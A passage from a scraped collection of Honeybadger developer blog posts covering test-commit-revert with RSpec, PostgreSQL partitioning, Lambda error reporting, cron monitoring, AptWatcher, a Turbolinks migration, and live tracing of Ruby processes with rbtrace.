after certain files in the project are saved. This will depend heavily on the project you're trying to test. Something like the following script, which is executed every time we save files with a plugin in the editor, is a good start: ( rspec && git commit -am \"WIP\" ) || git reset --hard If you're using Visual Studio Code, a good plugin to execute on every save is \"runonsave\" . You can include the above command or a similar one for your project. In this case, the whole config file would be { \"folders\" : [{ \"path\" : \".\" }], \"settings\" : { \"emeraldwalk.runonsave\" : { \"commands\" : [ { \"match\" : \"*.rb\" , \"cmd\" : \"cd ${workspaceRoot} && rspec && git commit -am WIP || git reset --hard\" } ] } } } Remember that later, you can squash the commit with Git directly in the command line or when merging the PR if you're using Github: . This means we'll only get one commit in the main branch for all the commits we did on the branch we're working on. This diagram from Github explains it well: . Writing our first test with TCR We'll use a simple example to illustrate the technique. We have a class that we know is working, but we need to modify it. We could just make a change and deploy the changes. However, we want to be sure that we don't break anything in the process, which is always a good idea. # worker.rb class Worker def initialize ( age , active_years , veteran ) @age = age @active_years = active_years @veteran = veteran end def can_retire? return true if @age >= 67 return true if @active_years >= 30 return true if @age >= 60 && @active_years >= 25 return true if @veteran && @active_years > 25 false end end The first step would be to create a new file for the tests, so we can start adding them there. We've seen the first line in the can_retire? method with def can_retire? return true if @age >= 67 ... ... end Thus, we can test this case first: # specs/worker_spec.rb require_relative './../worker' describe Worker do describe 'can_retire?' do it \"should return true if age is higher than 67\" do end end end Here's a quick tip: when you're working with TCR, every time you save, the latest changes will disappear if the tests don't pass. Therefore, we want to have as much code as possible to \"set up\" the test before actually writing and saving the line or lines with the assertion. If we save the above file like that, we can then add a line for the test. require_relative './../worker' describe Worker do describe 'can_retire?' do it \"should return true if age is higher than 67\" do expect ( Worker . new ( 70 , 10 , false ). can_retire? ). to be_true ## This line can disappear when we save now end end end When we save, if the new line doesn't vanish, we've done a good job; the test passes! Adding more tests Once we have our first test, we can keep adding more cases while taking into account false cases. After some work, we have something like this: # frozen_string_literal: true require_relative './../worker' describe Worker do describe 'can_retire?' do it 'should return true if age is higher than 67' do expect ( Worker . new ( 70 , 10 , false ). can_retire? ). to be true end it 'should return true if age is 67' do expect ( Worker . new ( 67 , 10 , false ). can_retire? ). to be true end it 'should return true if age is less than 67' do expect ( Worker . new ( 50 , 10 , false ). can_retire? ). to be false end it 'should return true if active years is higher than 30' do expect ( Worker . new ( 60 , 31 , false ). can_retire? ). to be true end it 'should return true if active years is 30' do expect ( Worker . new ( 60 , 30 , false ). can_retire? ). to be true end end end In every case, we write the \"it\" block first, save, and then add the assertion with expect(...) . As usual, we can add as many tests as possible, but it makes sense to avoid adding too many once we're relatively sure that everything is covered. There are still a few cases to cover, so we should add them just for completeness. Final tests Here's the spec file in its final form. As you can see, we could still add more cases, but I think this is enough to illustrate the process of TCR. # frozen_string_literal: true require_relative './../worker' describe Worker do describe 'can_retire?' do it 'should return true if age is higher than 67' do expect ( Worker . new ( 70 , 10 , false ). can_retire? ). to be true end it 'should return true if age is 67' do expect ( Worker . new ( 67 , 10 , false ). can_retire? ). to be true end it 'should return true if age is less than 67' do expect ( Worker . new ( 50 , 10 , false ). can_retire? ). to be false end it 'should return true if active years is higher than 30' do expect ( Worker . new ( 60 , 31 , false ). can_retire? ). to be true end it 'should return true if active years is 30' do expect ( Worker . new ( 20 , 30 , false ). can_retire? ). to be true end it 'should return true if age is higher than 60 and active years is higher than 25' do expect ( Worker . new ( 60 , 30 , false ). can_retire? ). to be true end it 'should return true if age is higher than 60 and active years is higher than 25' do expect ( Worker . new ( 61 , 30 , false ). can_retire? ). to be true end it 'should return true if age is 60 and active years is higher than 25' do expect ( Worker . new ( 60 , 30 , false ). can_retire? ). to be true end it 'should return true if age is higher than 60 and active years is 25' do expect ( Worker . new ( 61 , 25 , false ). can_retire? ). to be true end it 'should return true if age is 60 and active years is 25' do expect ( Worker . new ( 60 , 25 , false ). can_retire? ). to be true end it 'should return true if is veteran and active years is higher than 25' do expect ( Worker . new ( 60 , 25 , false ). can_retire? ). to be true end end end Ways to Refactor If you've read this far, there's probably something that feels a bit off with the code. We have many \"magical numbers\" that should be extracted into constants, both in the test and in the Worker class. We could also create private methods for each case in the main can_retire? public method. I'll leave both potential refactorings as exercises for you. However, we have tests now, so if we make a mistake in any step, they will tell us. Conclusions I encourage you to try TCR with your projects. It's a very cheap experiment because you don't need any fancy continuous integration in an external server or a dependency with a new library. All you need is a way to execute a command every time you save certain files on your computer. It'll also give you a \"gaming\" experience when adding tests, which is always fun and interesting. Additionally, the discipline of having failing tests removed from your editor will give you an extra safety net by confirming that the tests you're pushing to the repository are passing. I hope you find this new technique useful when dealing with legacy code. I've used multiple times in the last few months, and it's always been a pleasure. Extra Resources Good video as an introduction . Kent Beck's take on how to use TCR in VS Code . VS Code's plugin to run a script on save .", "date": "2020-10-06"},
{"website": "Honey-Badger", "title": "Managing PostgreSQL partitioned tables with Ruby", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/pg-partition-manager/", "abstract": "We use partitioned tables in our primary PostgreSQL database to efficiently expire old data, as deleting a bunch of data from a huge table can cause database performance to suffer. Prior to version 10, PostgreSQL didn't have native support for partitioned tables, so we used the pg_partman extension to implement partitioning. It works by using PostgreSQL's table inheritance to create child tables of the table that is to be partitioned and triggers to insert data into the child tables rather than the parent table. That extension has worked well for us, but it has a downside -- it isn't an option when you are using Amazon RDS, as it isn't supported. Now that that PostgreSQL has support for native partitions, I figured now was the time to see about dropping that extension so we'd have the option of using RDS. Our partitioning use-case is fairly simple: we partition tables based on time, creating a new partition for every day, week, or month, depending on how many rows we want to store across all partitions and on how long we want to retain the data. All of our partitioned tables have a created_at column that will be used to determine which partition stores each row. For example, we might have a table defined like this: create table events ( project_id integer , data jsonb , created_at timestamp ) partition by range ( created_at ); And if we wanted to have weekly partitions, they would look like this: create table events_p2019_10_28 partition of events for values from ( '2019-10-28' ) to ( '2019-11-04' ); create table events_p2019_11_04 partition of events for values from ( '2019-11-04' ) to ( '2019-11-11' ); With a time-based partitioning scheme, deleting old data is as simple as dropping one of the partitions. The regular maintenance we need to do, then, is create new partitions for date ranges as we approach them and delete old partitions containing data we no longer want. To make that maintenance a little easier, I have created the pg_partition_manager gem . Naturally, it's inspired by my experience with the pg_partman extension, which has served us so well. Let's take a look at how you'd use this gem, given the events table and partitioning scheme described above. You would create a script or rake task that looks like this: require \"pg_partition_manager\" PgPartitionManager :: Time . process ([{ parent_table: \"public.events\" , period: \"week\" , premake: 1 , retain: 3 }]) The parent_table is defined as schema.table_name ( public , the default schema, is often the only one Rails developers end up using). The period can be day, week, or month. You can choose how many tables you want created in advance (after the current period) with premake , and how many tables you want to keep (prior to the current period) with retain . The gem defaults to pre-creating 4 tables if you don't specify premake , and it defaults to retaining data for 7 days, 4 weeks, and 6 months if you don't specify retain . Invoke that script/task with a daily cron job, and you're all set -- it will create and drop the tables as needed. All ActiveRecord queries act just as they would with a non-partitioned table, so there's nothing you need to change in your code. That is, Event.create , Event.where , etc., will work just as they always have, with PostgreSQL putting the data in the right partition for you when you insert it. There is one change you may notice if you have lots of data, though... when you include created_at in your queries, PostgreSQL won't have to scan all the partitions -- just the ones the cover the range you specify in your where clause. To recap, if you have a lot of time-based data that you want to delete as it expires, use PostgreSQL partitioned tables and the pg_partition_manager gem to make your app happy. :)", "date": "2019-10-30"},
{"website": "Honey-Badger", "title": "How to report Node.js errors from AWS Lambda", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/how-to-report-node-js-errors-from-aws-lambda/", "abstract": "TLDR: We've created our own Node.js template to automatically monitor AWS Lambda functions for errors. Get the code here . AWS Lambda allows you to invoke a custom function in response to events such as an HTTP request, a message from SNS, an S3 event, or even to perform arbitrary units of work. The functions themselves -- called handlers -- can be written in Node.js, Java, or Python. Today we're going to take a look at how to set up a Node.js handler and monitor it for errors using Honeybadger for Node.js . The anatomy of a handler In Node.js, a handler is a simple JavaScript function with two arguments: event and context. The handler should be assigned to exports.handler inside the file that is loaded by AWS. Consider the following example: exports . handler = function ( event , context ) { if ( event . success === true ) { context . succeed ( \" Hello world \" ); } else { context . fail ( \" Goodbye, cruel world. \" ); } }; The event argument is the data passed into the function from the event source, which could be anything from a Kenesis stream to an API request. When it reaches your function, the event is just a simple JSON object, and therefore can be totally arbitrary. In this example, we could test this function with the following event data to make it succeed: { \"success\" : true } The context argument is provided by AWS Lambda and contains useful information about the runtime in addition to some important functions: context.succeed() and context.fail() . In order to properly terminate your Lambda function's execution, you must call one of these functions to indicate a successful or unsuccesful result. Otherwise, your function will continue to execute until the Node.js event queue is empty or the configured timeout is reached. Creating your first Lambda Function The following is an example handler provided by AWS. It takes an event including options and request data and makes an HTTPS request to the provided endpoint: var https = require ( ' https ' ); /**\n * Pass the data to send as `event.data`, and the request options as\n * `event.options`. For more information see the HTTPS module documentation\n * at https://nodejs.org/api/https.html.\n *\n * Will succeed with the response body.\n */ exports . handler = function ( event , context ) { var req = https . request ( event . options , function ( res ) { var body = '' ; console . log ( ' Status: ' , res . statusCode ); console . log ( ' Headers: ' , JSON . stringify ( res . headers )); res . setEncoding ( ' utf8 ' ); res . on ( ' data ' , function ( chunk ) { body += chunk ; }); res . on ( ' end ' , function () { console . log ( ' Successfully processed HTTPS response ' ); // If we know it's JSON, parse it if ( res . headers [ ' content-type ' ] === ' application/json ' ) { body = JSON . parse ( body ); } context . succeed ( body ); }); }); req . on ( ' error ' , context . fail ); req . write ( JSON . stringify ( event . data )); req . end (); }; If you have an AWS account you can try creating a new Lambda function from this template here . To finish creating your function, give it a name and select a role (\"Basic execution role\" should work). The default memory and timeout settings are fine. The heart of a Lambda function's execution is the event payload, which is just a JSON object. The event object can contain any data that the function needs to execute. If you test your new function using the default test event data from the AWS console, you'll probably see an error like this: START RequestId: 53a5a8e9-d043-11e5-aa29-3fb208bb8a4a Version: $LATEST\n2016-02-10T22:12:09.104Z  53a5a8e9-d043-11e5-aa29-3fb208bb8a4a  TypeError: Cannot read property 'protocol' of undefined\n    at Object.exports.request (https.js:100:14)\n    at exports.handler (/var/task/index.js:11:21)\nEND RequestId: 53a5a8e9-d043-11e5-aa29-3fb208bb8a4a\nREPORT RequestId: 53a5a8e9-d043-11e5-aa29-3fb208bb8a4a  Duration: 192.04 ms Billed Duration: 200 ms   Memory Size: 128 MB Max Memory Used: 10 MB  \nProcess exited before completing request Oops! It looks like we're missing some options that our handler needs to make the HTTP request, and the function is throwing an uncaught TypeError because the event.options key is missing. To make this function actually send an HTTP request we need to provide it with valid options and data (optional): { \"options\" : { \"host\" : \"encrypted.google.com\" , \"port\" : 443 , \"method\" : \"GET\" , \"path\" : \"/\" }, \"data\" : { \"hello\" : \"world\" } } To configure the test event, select \"Actions\" -> \"Configure test event\" while viewing your Lambda function in the AWS console. Running the test again with the correct options should cause your test to succeed. So that's great! We can use this function to securely send arbitrary data to any HTTPS endpoint we want, on-demand; a great use case for this is delivering WebHooks. Monitoring Lambda Functions for errors But what about that first error we encountered? And what about other errors? This function is fairly brittle; if you forget a required event key it will crash; if the HTTP response is invalid JSON (or sends the wrong Content-Type header) it will also crash. The good news is that AWS Lambda provides built-in monitoring through Amazon CloudWatch. It's relatively easy to get pretty charts on anything from average invocation counts, durations, and even errors. CloudWatch also allows you to create alarms when a metric exceeds a threshold, so you could set up an alarm to send an SNS message when the error rate for your function exceeds a certain level. If you want more fine-grained notifications about errors, however, you're on your own. Luckily, Honeybadger has you covered. We've developed our own template for creating a Lambda function which reports all unhandled exceptions to Honeybadger. You can get the code here . We're relying on some 3rd-party dependencies via NPM (including our own honeybadger client package for Node), so we're using the advanced scenario (\"upload a zip file\") method to deploy our handlers. Reporting errors to Honeybadger First, clone our template repo: git clone git@github.com:honeybadger-io/honeybadger-lambda-node.git ./lambda_func cd ./lambda_func Next we're going to modify the index.js file to make HTTP requests using the Node.js HTTPS function template from before: console . log ( \" Loading function \" ); // Change to your Honeybadger.io API key. const HB_API_KEY = ' your api key ' ; var https = require ( ' https ' ); /**\n * Pass the data to send as `event.data`, and the request options as\n * `event.options`. For more information see the HTTPS module documentation\n * at https://nodejs.org/api/https.html.\n *\n * Will succeed with the response body.\n */ function handler ( event , context ) { var req = https . request ( event . options , function ( res ) { var body = '' ; console . log ( ' Status: ' , res . statusCode ); console . log ( ' Headers: ' , JSON . stringify ( res . headers )); res . setEncoding ( ' utf8 ' ); res . on ( ' data ' , function ( chunk ) { body += chunk ; }); res . on ( ' end ' , function () { console . log ( ' Successfully processed HTTPS response ' ); // If we know it's JSON, parse it if ( res . headers [ ' content-type ' ] === ' application/json ' ) { body = JSON . parse ( body ); } context . succeed ( body ); }); }); req . on ( ' error ' , context . fail ); req . write ( JSON . stringify ( event . data )); req . end (); } // Takes a handler function and returns a new function which reports errors to // Honeybadger. function makeHandler ( handler ) { var Honeybadger = require ( \" honeybadger \" ), Promise = require ( \" promise \" ); var hb = new Honeybadger ({ apiKey : HB_API_KEY , logger : console // Required for events to be emitted. }); var send = function ( err , opts ) { return new Promise ( function ( resolve , reject ) { hb . once ( \" error \" , reject ). once ( \" remoteError \" , reject ). once ( \" sent \" , resolve ); hb . send ( err , opts ); }); }; return function ( event , context ) { try { handler . apply ( this , arguments ); } catch ( err ) { send ( err , { context : { event : event } }). then ( function () { context . fail ( err ); }). catch ( function ( sendErr ) { console . error ( \" Unable to report error to Honeybadger: \" , sendErr ) context . fail ( err ); }); } } } // Build and export the function. exports . handler = makeHandler ( handler ); Don't forget to change the HB_API_KEY constant to the API key for your project in Honeybadger. If you don't have an account you can create a 15-day free trial here . Save the new index.js , and then build the .ZIP file: npm install make build To replace the old lambda function with your monitored function, select \"Upload a .ZIP file\" as your code entry type instead of \"Edit code inline\". Follow the instructions to upload the .zip file and then test your function again (perhaps with an empty test event payload: {} ). You should now see the original error in Honeybadger, in realtime! Further reading: Best practices for Working with AWS Lambda Functions Troubleshooting and Monitoring AWS Lambda Functions with Amazon CloudWatch Creating Amazon CloudWatch Alarms The context object", "date": "2016-02-15"},
{"website": "Honey-Badger", "title": "Error Monitoring for Cron Jobs and Command-Line Programs", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/honeybadger-exec/", "abstract": "Most web apps have some pieces that live outside of the application itself. Backups have to run, datasets have to be imported and dunning emails have to be sent. But what happens if there's an error? When you're working inside the Rails environment like many Rake, Sidekiq and Resque jobs do, errors are reported by Honeybadger automatically. But if your task doesn't load the Rails environment it's been difficult to report failures to Honeybadger...until now. Version 3.x of the Honeybadger gem sports a lovely new CLI interface that can take the STDERR of any program and report it to Honeybadger as if it were an error in your Rails app. Here's what it looks like: $ honeybadger exec my-command --my-flag If my-command writes to STDERR or exits with a non-zero status code (indicating an error) then Honeybadger will send the command's STDERR and STDOUT output to our servers and alert you via email, slack or any other of our third-party integrations. Built for Cron The new honeybadger exec feature was built with cron in mind. If you've ever run cron on a production server you know that its notification system leaves a lot to be desired. It will email you whenever your job outputs anything whether there was an error or not. By default, honeybadger exec will only write to STDOUT if there is an error. That means that cron will only email you if there's an error. This can be useful if you want a redundant error report in addition to the one that Honeybadger will send you. To see this in action, we can run a command that does nothing but write a test string to STDERR: honeybadger exec '>&2 echo \"error\"'\nHoneybadger detected failure or error output for the command:\n`>&2 echo \"error\"`\n\nPROCESS ID: 85296\n\nRESULT CODE: 0\n\nERROR OUTPUT:\nerror\n\nSuccessfully notified Honeybadger If you'd like to prevent cron from emailing you at all, you can suppress all output via the --quiet flag. Of course, the error will still be sent to Honeybadger, and we'll still notify via email, slack or another channel: honeybadger exec --quiet '>&2 echo \"error\"' Configuration If you run honeybadger exec in the root directory of your Rails project, it will automatically use the Honeybadger configuration from that project. If you'd like to use honeybadger exec outside of your Rails environment, you'll need to provide its API key and other configuration options. You can set the API key and the environment name by using command-line arguments: honeybadger exec --api-key=12345 --env=production my-command --my-flag For more advanced configuration of honeybadger exec you can put configuration options in ~/honeybadger.yml or in your environment variables. See the Docs .", "date": "2017-03-14"},
{"website": "Honey-Badger", "title": "Announcing AptWatcher", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/aptwatcher-a-slack-friendly-apticron-replacement/", "abstract": "At Honeybadger we have been using apticron to keep on top of apt\npackage updates for all servers.  At first I had the apticron emails\ncoming to my inbox, but at some point I decided I'd rather have them in\nour Slack notifications channel.  Slack has a handy email app that can\nreceive emails and post them to a channel, so I tried that.  It worked,\nbut I didn't love how the emails showed up as files, and there was all\nthe noise of mail headers, etc., so I decided to whip up something that\nI would like a little more.  Thus AptWatcher was born. AptWatcher is a super simple app that I quickly threw together on a\nweekend to relay information about apt package updates from our servers\nto our Slack notifications channel.  All it does it provide a HTTP\nendpoint that listens for a list of package names and versions that are\nready to updated on a server.  It compares that list to the list\npreviously received from the server, and if any packages are found in\nthe new list that weren't in the old list, it sends along those new\npackages to Slack via an incoming webhook. That list of packages can be generated on the server by running this: $ apt-get upgrade -s | grep ^Inst | awk '{ print $2,$3; }' | tr -d '[]' That generates a list of packages that looks like this: libxml2-dev 2.9.1+dfsg1-3ubuntu4.7\nlibxml2 2.9.1+dfsg1-3ubuntu4.7\nlibnl-genl-3-200 3.2.21-1ubuntu1.1\nlibnl-3-200 3.2.21-1ubuntu1.1 And that same list will show up in Slack when routed through AptWatcher: Installation Installation is as simple as clicking the Heroku button in the repo's\nREADME, and then adding a cron job to all your servers to report package\nchanges to AptWatcher.  Host records will get created automatically in\nAptWatcher as the reports arrive from the servers. We use Ansible at Honeybadger to automate all the things, so I took\nthe quick-and-dirty approach to replace apticron with AptWatcher: $ ansible all -m apt -a 'pkg=apticron state=removed'\n$ ansible all -m cron -a \"name='Report pending apt changes' special_time=daily job='apt-get upgrade -s | grep ^Inst | awk \\'{ print \\$2,\\$3; }\\' | tr -d \\'[]\\' | curl -u user:pass --data-binary @- https://our.aptwatcher.url/report/\\$(hostname) &> /dev/null'\" Once that's done, all you need to do is wait for the package reports to\nshow up in Slack.  Easy-peasy!", "date": "2016-07-06"},
{"website": "Honey-Badger", "title": "How We Migrated To Turbolinks Without Breaking Javascript", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/turbolinks/", "abstract": "It's 2019, so we decided it was time to take a more modern approach to the Honeybadger front end. We implemented Turbolinks! This is only the first step on an ambitious roadmap. In 2025 we plan to migrate to Angular 1, and we'll finish out the decade on React unless we run into any roadblocks! But let's get real. Honeybadger isn't a single page app, and it probably won't ever be. SPAs just don't make sense for our technical requirements. Take a look: Our app is mostly about displaying pages of static information. We crunch a lot of data to generate a single error report page. We have a very small team of four developers, and so we want to keep our codebase as small and simple as possible. The Days of PJAX There's an approach we've been using for years that lets us have our cake and eat it too. It's called PJAX, and its big idea is that you can get SPA-like speed without all the Javascript. When a user clicks a link, the PJAX library intercepts it, fetches the page and updates the DOM with the new HTML. It's not perfect, but it works better than you'd think -- especially for an app like ours. The only problem is that our PJAX library is no longer maintained and was preventing us from updating jQuery (ugh). So it had to go. Moving to Turbolinks Now if you think about it, PJAX sounds a lot like Turbolinks. They both use JS to fetch server-rendered HTML and put it into the DOM. They both do caching and manage the forward and back buttons. It's almost as if the Rails team took a technique developed elsewhere and just rebranded it. Well, I'm glad they did, because Turbolinks is a much better piece of software than jquery-pjax ever was. It's actively maintained and doesn't require jQuery at all! So we're one step closer to our dream of ditching $ . In this article, I'm going to tell you about our migration from PJAX to Turbolinks. The good news is that Turbolinks works surprisingly well out-of-the-box. The only tricky thing about it is making it work with your JavaScript. By the end of this article I hope you'll have a good idea of how to do that. Turbolinks is a Single-Page Application Turbolinks doesn't just give you some of the benefits of a single-page app. Turbolinks is a single page app. Think about it: When someone visits your site, you serve them some HTML and Javascript. The JavaScript takes over and manages all subsequent changes to the DOM. If that's not a single-page app, I don't know what is. Now let me ask you, do you write JS for a single page application differently from a \"traditional\" web application? I sure hope you do! In a \"traditional\" application, you can get away with being sloppy because every time the user navigates to a new page, their browser destroys the DOM and the JavaScript context. SPAs, though, require a more thoughtful approach. An Approach to JS that works If you've been around for a while you probably remember writing code that looked something like this: $(document).ready(function() {\n      $(\"#mytable\").tableSorter();\n    }); It uses jQuery to initialize a table-sorting plugin whenever the document finishes loading. Let me ask you: where's the code that unloads the table-sorter plugin when the page unloads? There isn't any. There didn't need to be back in the day because the browser handled the cleanup. However, in a single-page application like Turbolinks, the browser doesn't handle it. You, the developer, have to manage initialization and cleanup of your JavaScript behaviors. When people try to port traditional web apps to Turbolinks, they often run into problems because their JS never cleans up after itself. All Turbolinks-friendly JavaScript needs to: Initialize itself when a page is displayed Clean up after itself before Turbolinks navigates to a new page. For new projects, I would recommend using Webpack, along with perhaps a lightweight framework like Stimulus . Capturing Events Turbolinks provides its own events that you can capture to set up and tear down your JavaScript. Let's start with the tear-down: document.addEventListener('turbolinks:before-render', () => {\n      Components.unloadAll(); \n    }); The turbolinks:before-render event fires before each pageview except the very first one. That's perfect because on the first pageview there's nothing to tear down. The events for initialization are a little more complicated. We want our event handler to runs: On the initial page load On any subsequent visit to a new page Here's how we capture those events: // Called once after the initial page has loaded\n    document.addEventListener(\n      'turbolinks:load',\n      () => Components.loadAll(),\n      {\n        once: true,\n      },\n    );\n\n    // Called after every non-initial page load\n    document.addEventListener('turbolinks:render', () =>\n      Components.loadAll(),\n    ); No, you're not crazy. This code seems a little too complicated for what it does. You'd think there would be an event that fires after any page is loaded regardless of the mechanism that loaded it. However, as far as I can tell, there's not. Loving and hating the cache One reason Turbolinks sites seem faster than traditional web apps is because of its cache. However, the cache can be a source of great frustration. Many of the edge cases we're going to discuss involve the cache in some way. For now, all you need to know is: Turbolinks caches pages immediately before navigating away from them. When the user clicks the \"Back\" button, Turbolinks fetches the previous page from the cache and displays it. When the user clicks a link to a page they've already visited, the cached version displays immediately. The page is also loaded from the server and displayed a short time later. Clear the Cache Often Whenever your front-end persists anything, you should probably clear the cache. A straightforward way to cover a lot of these cases is to clear the cache whenever the front-end makes a POST request. In our case, 90% of these requests originate from Rails' UJS library. So we added the following event handler: $(document).on('ajax:before', '[data-remote]', () => {\n      Turbolinks.clearCache();\n    }); Don't Expect a Clean DOM Turbolinks caches pages right before you navigate away from them. That's probably after your JavaScript has manipulated the DOM. Imagine that you have a dropdown menu in its \"open\" state. If the user navigates away from the page and then comes back, the menu is still \"open,\" but the JavaScript that opened it might be gone. This means that you have to either: Write your JS so that it's unfazed by encountering the DOM elements it manipulates in an unclean state. When your component is \"unloaded\" make sure to return the DOM to an appropriate state. These requirements are easy to meet in your JavaScript. However, they can be harder to meet with third-party libraries. For example, Bootstrap's modals break if Turbolinks caches them in their \"open\" state. We can work around the modal problem, by manually tidying the DOM before the page is cached. Below, we remove any open bootstrap modals from the DOM. document.addEventListener('turbolinks:before-cache', () => {\n      // Manually tear down bootstrap modals before caching. If turbolinks\n      // caches the modal then tries to restore it, it breaks bootstrap's JS.\n      // We can't just use bootstrap's `modal('close')` method because it is async.\n      // Turbolinks will cache the page before it finishes running.\n      if (document.body.classList.contains('modal-open')) {\n        $('.modal')\n          .hide()\n          .removeAttr('aria-modal')\n          .attr('aria-hidden', 'true');\n        $('.modal-backdrop').remove();\n        $('body').removeClass('modal-open');\n      }\n    }); Remove all Javascript from the body Turbolinks runs any javascript it encounters in the body of your HTML. This behavior may sound useful, but it's an invitation to disaster. In \"traditional\" web apps, scripts placed in the body run precisely once. However, in Turbolinks, it could be run any number of times. It runs every time your user views that page. Do you have a third-party chat widget that injects a <script> tag into the page? Be prepared to get 10, 50, 100 script tags injected. Do you set up an event handler? Be prepared to get 100 of them and have them stay active when you leave the page. Do you track page views with Google Analytics? Be prepared to have two page views registered each time the user visits a cached paged. Why? Turbolinks first displays a cached version, then immediately displays a server-rendered version of the page. So for one \"pageview,\" your page's inline JS runs twice. The problem isn't just inline JavaScript. It's any JavaScript placed in the document's body, even when loaded as an external file. So do yourself a favor and keep all JavaScript in the document's head, where it belongs. Use JS Modules to Load Third-Party Widgets If you can't use inline JS to load your third-party widgets, how can you do so? Many, such as our own honeybadger-js library provide npm packages that can be used to import them to webpack or another build tool. You can then import them and configure them in JS. // Here's how you can set up honeybadger-js inside webpack.\n    // Because the webpack output is included in the document head, this \n    // will only be run once. \n\n    import Honeybadger from 'honeybadger-js';\n\n    const config = $.parseJSON($(\"meta[name=i-honeybadger-js]\").attr('content'));\n\n    Honeybadger.configure({\n      api_key: this.config.key,\n      host: this.config.host,\n      environment: this.config.environment,\n      revision: this.config.revision,\n    }); There are lots of ways you could pass data like API keys from the server. We encode them as JSON and put them in a meta tag that is present on every page. %meta{name: \"i-honeybadger-js\", content: honeybadger_configuration_as_json} Sadly, some third-party services don't provide npm packages. Instead, they make you add a <script> tag to your HTML. For those, we wrote a JS wrapper that injects the script into the dom and configures it. Here's an example of how we wrap the heroku widget for users who purchase our service as a Heroku add-on. class Heroku extends Components.Base {\n      // For every page load, see if heroku's JS is loaded. If not, load it.\n      // If so, reinitialize it to work with the reloaded page. \n      initialize() {\n        this.config = $.parseJSON(this.$el.attr('content'));\n        if (this.herokuIsLoaded()) {\n          this.initHeroku();\n        } else {\n          this.loadHeroku();\n        }\n      }\n\n      herokuIsLoaded() {\n        return !!window.Boomerang;\n      }\n\n      initHeroku() {\n        window.Boomerang.init({ app: this.config.app, addon: 'honeybadger' });\n      }\n\n      loadHeroku() {\n        const script = document.createElement('script');\n        script.type = 'text/javascript';\n        script.async = true;\n        script.onload = () => this.initHeroku();\n        script.src =\n          '<https://s3.amazonaws.com/assets.heroku.com/boomerang/boomerang.js>';\n        document.getElementsByTagName('head')[0].appendChild(script);\n      }\n    }\n\n    Components.collection.register({\n      selector: 'meta[name=i-heroku]',\n      klass: Heroku,\n    }); Handle Asset Updates Gracefully Since Turbolinks is a single page application, active users may still be using an old copy of your JS and CSS after you deploy. If they request a page that depends on the new assets, you're in trouble. Fortunately, you can tell Turbolinks to watch for changes in asset file names, and do a hard reload whenever they change. This approach works well in Rails because your application CSS and JS typically have a content hash appended to their filenames. To enable this feature, we need to set the data-turbolinks-track attribute on the appropriate <style> and <link> tags. With rails/webpacker, it looks like this: = stylesheet_pack_tag \"application\", \"data-turbolinks-track\": \"reload\"\n    = javascript_pack_tag 'application', \"data-turbolinks-track\": \"reload\" Give to Turbolinks what belongs to Turbolinks Finally, realize that using Turbolinks involves giving up control of some things. You can't manipulate the window location in any way using JS without breaking Turbolinks. We had been saving the currently-selected tab state in the URL hash but had to get rid of it. Using jquery to fake clicks on links doesn't work. Instead, you should manually invoke Turbolinks.visit . Conclusion I'm a fan of Turbolinks. We've discussed many edge cases here, but for the most part, it works very well out of the box. PJAX touched nearly every part of our front-end. Replacing something that central was never going to be painless. However, I have to say the migration went much more smoothly than I ever expected. We've been running it in production for several weeks now and have only had two minor bug reports. For the most part, it seems like nobody noticed the switch, which is my ideal outcome.", "date": "2019-07-17"},
{"website": "Honey-Badger", "title": "ElixirConf 2016 Ticket Giveaway Winner", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/elixirconf-2016-giveaway-winner/", "abstract": "Thanks to all who entered our ElixirConf 2016 ticket giveaway. After 127 submissions, it ultimately came down to one winner. Congratulations to Dorothy Thurston! We asked her a few questions about her experience with Elixir. What got you interested in Elixir? I got interested in Elixir because I wanted to try out a functional programming language. What conference talks interest you? A bunch! The Future of Deployment in Elixir; Elixir in Elixir; Refactoring Techniques for Elixir, Ecto, and Phoenix. That's just a few. What projects are you working on in Elixir? I'm pretty new to the Elixir scene so at the moment I'm mainly working on my intro level Phoenix applications. Thanks for sharing, Dorothy! We hope you have a fantastic time at ElixirConf 2016. A special offer for the giveaway contestants Look for an email with a special offer. Thanks to all who participated.", "date": "2016-08-04"},
{"website": "Honey-Badger", "title": "Spying on running Ruby processes", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/spying-on-running-ruby-processes/", "abstract": "Did you know that it's possible to log all method calls as they occur in a running process in real time? How about injecting code to be executed inside of a running process? You can – via the magic of the rbtrace gem. The rbtrace gem comes with two parts. The first is a library that you include in the code that you want to trace. The second is a commandline utility for querying trace data. Let's take a look at a simple example. The code that we're going to trace is really simple. All we have to do is require the rbtrace gem. require 'rbtrace' require 'digest' require 'securerandom' # An infinite loop while true # Do some work. Digest :: SHA256 . digest SecureRandom . random_bytes ( 2 ** 8 ) # Sleep for one second on every iteration. sleep 1 end Now let's run this program: $ ruby trace.rb &\n[1] 12345 We take this process ID and give it to the rbtrace command line tool. The -f option indicates \"firehose\" mode, which prints everything to screen. $ rbtrace - p 12345 - f *** attached to process 12345 Fixnum #** <0.000010> SecureRandom . random_bytes Integer #to_int <0.000005> SecureRandom . gen_random OpenSSL :: Random . random_bytes < 0.002223 > SecureRandom . gen_random < 0.002243 > SecureRandom . random_bytes < 0.002290 > Digest :: SHA256 . digest Digest :: Class #initialize <0.000004> Digest :: Instance #digest Digest :: Base #reset <0.000005> Digest :: Base #update <0.000210> Digest :: Base #finish <0.000006> Digest :: Base #reset <0.000005> Digest :: Instance #digest <0.000267> Digest :: SHA256 . digest < 0.000308 > Kernel #rand Kernel #respond_to_missing? <0.000008> Kernel #rand <0.000071> Kernel #sleep <1.003233> This is really cool! We can see every method that gets called along with the time spent in that method. If we wanted to home in on a specific method, we could use the -m option. $ rbtrace - p 12345 - m digest *** attached to process 12345 Digest :: SHA256 . digest Digest :: Instance #digest <0.000201> Digest :: SHA256 . digest < 0.000220 > Digest :: SHA256 . digest Digest :: Instance #digest <0.000287> Digest :: SHA256 . digest < 0.000343 > Probably the coolest use of this gem is to get a heap dump from a running web server. Heap dumps contain every object in memory along with a bunch of metadata and are very useful for debugging memory leaks in production. To get the heap dump use a command like the one below, taken from this post by Sam Saffron. $ bundle exec rbtrace -p <SERVER PID HERE> -e 'Thread.new{GC.start;require \"objspace\";io=File.open(\"/tmp/ruby-heap.dump\", \"w\"); 